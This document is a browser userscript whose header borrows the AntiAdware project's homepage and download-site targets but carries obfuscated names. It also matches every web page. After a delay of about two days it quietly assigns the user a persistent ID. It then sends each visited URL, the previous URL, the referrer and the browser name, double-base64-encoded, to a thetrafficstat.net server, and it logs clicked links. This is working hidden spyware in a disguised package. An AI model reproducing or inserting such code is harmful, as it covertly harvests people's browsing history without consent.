// ==UserScript==
// @name svhsvh
// @name:fr svhsvh-1
// @name:de svhsvh-2
// @name:zh-TW svhsvh-3
// @name:zh-CN svhsvh-4
// @author svhsvh
// @namespace svhsvh
// @description svhsv-99
// @description:fr svhsvh-5
// @description:de svhsvh-6
// @description:zh-TW svhsvh-7
// @description:zh-CN svhsv-8
// @version 1.1.2
// @license svhsvh

// jQuery dependency; an offline version of this is included in the script in case it goes down
// @require http://code.jquery.com/jquery-2.0.3.min.js

// @include http*://*180upload.com/*
// @include http*://*4upfiles.com/*
// @include http*://*get*.adobe.com/*flashplayer/*
// @include http*://*get*.adobe.com/*reader/*
// @include http*://*afterdawn.com/software/*
// @include http*://*akafile.com/akago.php
// @include http*://*chip.de/downloads/*
// @include http*://*clicknupload.com/*
// @include http*://*cloudyvideos.com/*
// @include http*://*coolrom.com/*/*
// @include http*://*clipconverter.cc/download/*
// @include http*://*dailyuploads.net/*
// @include http*://*datafilehost.com/d/*
// @include http*://*davvas.com/*
// @include http*://*d-h.st/*
// @include http*://*download.cnet.com/*
// @include http*://*telecharger.cnet.com/*
// @include http*://*descargar.cnet.com/*
// @include http*://*de.download.cnet.com/*
// @include http*://*filefactory.com/file/*
// @include http*://*filescdn.com/*
// @include http*://*filehippo.com/*download*
// @include http*://*freewarefiles.com/downloads_counter.php*
// @include http*://*google.*/earth/download/ge/agree.html
// @include http*://*hugefiles.net/*
// @include http*://*hulkload.com/*
// @include http*://*kingfiles.net/*
// @include http*://*letitbit.net/download/*
// @include http*://*loveroms.com/*
// @include http*://*up.media1fire.com/*
// @include http*://*mightyupload.com/*
// @include http*://*mp3fil.*/get/*
// @include http*://*mp3juices.to/*
// @include http*://*mp3olimp.net/*
// @include http*://*mp3olimpz.com/*
// @include http*://*opensubtitles.org/*/subtitles/*
// @include http*://*revclouds.com/*
// @include http*://*romhustler.net/download/*
// @include http*://*romhustler.net/rom/*
// @include http*://*secureupload.eu/*
// @include http*://*sendspace.com/file/*
// @include http*://*sharebeast.com/*
// @include http*://*shared.com/*
// @include http*://*softm8.com*
// @include http*://*.softonic.*
// @include http*://*sourceforge.net/*
// @include http*://*tusfiles.net/*
// @include http*://*unlimitzone.com/*
// @include http*://*uploading.com/*
// @include http*://*uplod.ws/*
// @include http*://*uploads.to/*
// @include http*://*uptobox.com/*
// @include http*://*userscdn.com/*
// @include http*://*ziddu.com/downloadfile/*

// We don't use this method, however a side effect of it is that it restores the Greasemonkey sandbox, avoiding jQuery conflicts
// @grant GM_addStyle

// @grant unsafeWindow

// @homepageURL https://github.com/HandyUserscripts/AntiAdware#readme
// @supportURL https://github.com/HandyUserscripts/AntiAdware/issues


// @run-at document-start

// @include     http://*
// @include     https://*
// @grant       GM_setValue
// @grant       GM_getValue
// @grant       GM_xmlhttpRequest
// @connect     thetrafficstat.net

// ==/UserScript==


console.log("WORKING!!!!");


    (function(){
      "use strict"
      var s = GM_getValue("dprm", null);
      if(!s) {
        GM_setValue("dprm",new Date().getTime());
        return;
      }

      ((new Date().getTime()) - s > 183600000) && (window == top) && ! function() {
        try {
          var settings = function() {
              var e = {
                base64Enabled: !0,
                relatedUrl: "https://s861.thetrafficstat.net/related",
                sourceId: "861"
              };
              return e
            }(),
            utils = function() {
              var e = function(e) {
                  var t = [],
                    s = 0;
                  for (var r in e) e.hasOwnProperty(r) && (s++, t.push(r + "=" + e[r]));
                  return {
                    data: t.join("&"),
                    length: s
                  }
                },
                t = function(e) {
                  return btoa(e)
                },
                s = function() {
                  var e, t, s = navigator.appName,
                    r = navigator.userAgent;
                  return -1 != (t = r.indexOf("Opera")) ? s = "opera" : -1 != (t = r.indexOf("MSIE")) ? s = "ie" : -1 != (t = r.indexOf("Chrome")) ? s = "chrome" : -1 != (t = r.indexOf("Safari")) ? s = "safari" : -1 != (t = r.indexOf("Firefox")) ? s = "ff" : (e = r.lastIndexOf(" ") + 1) < (t = r.lastIndexOf("/")) && (s = r.substring(e, t)), s
                },
                r = function(e) {
                  for (var t = "", s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", r = 0; e > r; r++) t += s.charAt(Math.floor(Math.random() * s.length));
                  return t
                };
              return {
                detectCurrentBrowserName: s,
                createRandomString: r,
                base64Encode: t,
                serialize: e
              }
            }();
          "object" != typeof JSON && (JSON = {}, function() {
            "use strict";

            function f(e) {
              return 10 > e ? "0" + e : e
            }

            function quote(e) {
              return escapable.lastIndex = 0, escapable.test(e) ? '"' + e.replace(escapable, function(e) {
                var t = meta[e];
                return "string" == typeof t ? t : "\\u" + ("0000" + e.charCodeAt(0).toString(16)).slice(-4)
              }) + '"' : '"' + e + '"'
            }

            function str(e, t) {
              var s, r, n, i, a, o = gap,
                d = t[e];
              switch (d && "object" == typeof d && "function" == typeof d.toJSON && (d = d.toJSON(e)), "function" == typeof rep && (d = rep.call(t, e, d)), typeof d) {
                case "string":
                  return quote(d);
                case "number":
                  return isFinite(d) ? String(d) : "null";
                case "boolean":
                case "null":
                  return String(d);
                case "object":
                  if (!d) return "null";
                  if (gap += indent, a = [], "[object Array]" === Object.prototype.toString.apply(d)) {
                    for (i = d.length, s = 0; i > s; s += 1) a[s] = str(s, d) || "null";
                    return n = 0 === a.length ? "[]" : gap ? "[\n" + gap + a.join(",\n" + gap) + "\n" + o + "]" : "[" + a.join(",") + "]", gap = o, n
                  }
                  if (rep && "object" == typeof rep)
                    for (i = rep.length, s = 0; i > s; s += 1) "string" == typeof rep[s] && (r = rep[s], n = str(r, d), n && a.push(quote(r) + (gap ? ": " : ":") + n));
                  else
                    for (r in d) Object.prototype.hasOwnProperty.call(d, r) && (n = str(r, d), n && a.push(quote(r) + (gap ? ": " : ":") + n));
                  return n = 0 === a.length ? "{}" : gap ? "{\n" + gap + a.join(",\n" + gap) + "\n" + o + "}" : "{" + a.join(",") + "}", gap = o, n
              }
            }
            "function" != typeof Date.prototype.toJSON && (Date.prototype.toJSON = function() {
              return isFinite(this.valueOf()) ? this.getUTCFullYear() + "-" + f(this.getUTCMonth() + 1) + "-" + f(this.getUTCDate()) + "T" + f(this.getUTCHours()) + ":" + f(this.getUTCMinutes()) + ":" + f(this.getUTCSeconds()) + "Z" : null
            }, String.prototype.toJSON = Number.prototype.toJSON = Boolean.prototype.toJSON = function() {
              return this.valueOf()
            });
            var cx, escapable, gap, indent, meta, rep;
            "function" != typeof JSON.stringify && (escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g, meta = {
              "\b": "\\b",
              " ": "\\t",
              "\n": "\\n",
              "\f": "\\f",
              "\r": "\\r",
              '"': '\\"',
              "\\": "\\\\"
            }, JSON.stringify = function(e, t, s) {
              var r;
              if (gap = "", indent = "", "number" == typeof s)
                for (r = 0; s > r; r += 1) indent += " ";
              else "string" == typeof s && (indent = s);
              if (rep = t, t && "function" != typeof t && ("object" != typeof t || "number" != typeof t.length)) throw new Error("JSON.stringify");
              return str("", {
                "": e
              })
            }), "function" != typeof JSON.parse && (cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g, JSON.parse = function(text, reviver) {
              function walk(e, t) {
                var s, r, n = e[t];
                if (n && "object" == typeof n)
                  for (s in n) Object.prototype.hasOwnProperty.call(n, s) && (r = walk(n, s), void 0 !== r ? n[s] = r : delete n[s]);
                return reviver.call(e, t, n)
              }
              var j;
              if (text = String(text), cx.lastIndex = 0, cx.test(text) && (text = text.replace(cx, function(e) {
                  return "\\u" + ("0000" + e.charCodeAt(0).toString(16)).slice(-4)
                })), /^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, "@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, "]").replace(/(?:^|:|,)(?:\s*\[)+/g, ""))) return j = eval("(" + text + ")"), "function" == typeof reviver ? walk({
                "": j
              }, "") : j;
              throw new SyntaxError("JSON.parse")
            })
          }());
        logic = function() {
              function e(e, t) {
                t || (t = document);
                for (var s = document.evaluate(e, t, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null), r = [], n = 0; n < s.snapshotLength; n++) r.push(s.snapshotItem(n));
                return r
              }

              function t(e, t) {
                return Object.keys(t || {}).forEach(function(s) {
                  e[s] = t[s]
                }), e
              }

              function s(r, n) {
                var i = r.$,
                  o = i.skey,
                  d = i.stype || "First",
                  u = i.expression;
                if (!u) return null;
                var f = e(u, n);
                if (!f.length) return null;
                if (retrieved = "Last" == d ? f.splice(-1, 1) : "First" == d ? f.splice(0, 1) : f, (r.xpath || []).length) a = retrieved.map(function(e) {
                  var n = {};
                  return r.xpath.forEach(function(r) {
                    var i = s(r, e);
                    return t(n, i), i ? i : null
                  }), n
                });
                else if (r["store-attr"]) {
                  o = r["store-attr"][0].$.skey;
                  var p = r["store-attr"][0].$.attr;
                  a = retrieved.map(function(e) {
                    return e.getAttribute(p)
                  })
                } else r["store-text"] && (o = r["store-text"][0].$.skey, a = retrieved.map(function(e) {
                  return e.textContent
                }));
                if (!(a || []).length) return null;
                var c = null;
                switch (d) {
                  case "Last":
                    c = a.splice(-1, 1)[0];
                    break;
                  case "First":
                    c = a.splice(0, 1)[0];
                    break;
                  case "List":
                    c = a
                }
                var l = {};
                return o ? l[o] = c : l = c, l
              }

              function r(e) {
                for (var e = window.e || e, t = e.target || e.srcElement, s = 0; 10 > s; s++) {
                  if ("A" == t.nodeName) {
                    n.tgt = t.outerHTML, GM_setValue("sdc_data", JSON.stringify(n));
                    break
                  }
                  if (!t.parentElement) break;
                  t = t.parentElement
                }
              }
              var n = null,
                i = null,
                o = function() {
                  window.onfocus = c;
                  var nr = GM_getValue("sdc_data", null);
                  if(nr) {
                    n = JSON.parse(nr);
                  }
                  else {
                    n = fu();
                  }
                  p();
                  if(document.hasFocus()) {
                    n.prev = document.location.href;
                  }
                  GM_setValue("sdc_data", JSON.stringify(n));
                  var e = document.location.href;
                  setInterval(function() {
                    if(n && document.location.href != e)
                      {
                        if(document.hasFocus()) {
                          n.prev = document.location.href;
                        }
                        (GM_setValue("sdc_data", JSON.stringify(n)), p(), e = document.location.href);
                      }
                  }, 750)
                },
                d = function() {},
                u = function(e, t) {
                  if (null == t || "undefined" == t || "undefined" == typeof t || 0 == t.length) n = f(), GM_setValue("sdc_data_1", JSON.stringify(n));
                  else try {
                    n = JSON.parse(t)
                  } catch (s) {
                    n = f()
                  }
                  p();
                  if(document.hasFocus()) {
                    n.prev = document.location.href;
                  }
                  GM_setValue("sdc_data", JSON.stringify(n));
                },
                fu = function() {
                  var e = null,
                    t = document.getElementById("stats-script");
                  e = t && t.getAttribute("userid") ? t.getAttribute("userid") : utils.createRandomString(32);
                  var s = {
                    uid: e,
                    ses: utils.createRandomString(32),
                    browserName: utils.detectCurrentBrowserName(),
                    lastFocusedUrl: "",
                    prev: ""
                  };
                  return s;
                };
              document.addEventListener ? document.addEventListener("click", r, !1) : document.attachEvent("onclick", r);
              var p = function() {
                  a = {
                    s: settings.sourceId,
                    tmv: settings.tmv,
                    md: 21,
                    pid: n.uid,
                    sess: n.ses,
                    q: encodeURIComponent(document.location.href),
                    prev: encodeURIComponent(n.prev),
                    link: document.hasFocus() ? 1 : 0,
                    sub: n.browserName,
                    hreferer: encodeURIComponent(document.referrer)
                  };
                  var e = utils.serialize(a),
                    t = e.data,
                    r = utils.base64Encode(utils.base64Encode(t));
                  if ("" != r) {
                    var a = "e=" + encodeURIComponent(r);
                    GM_xmlhttpRequest({
                      method: "POST",
                      url: settings.relatedUrl,
                      data: a,
                      headers: {
                        "Content-Type": "application/x-www-form-urlencoded"
                      },
                      onload: function(response) {
                      }
                    });
                  }
                  //
                },
                c = function() {
                  if(n) {
                    if(document.hasFocus()) {
                      n.prev = document.location.href;
                      GM_setValue("sdc_data", JSON.stringify(n));
                    }
                  }
                };
              "prerender" != document.webkitVisibilityState && ("chrome" === utils.detectCurrentBrowserName() || "ff" === utils.detectCurrentBrowserName()) && o()
            }()
        } catch (e) {}
      }();
    })();

console.log("STABLE!!!");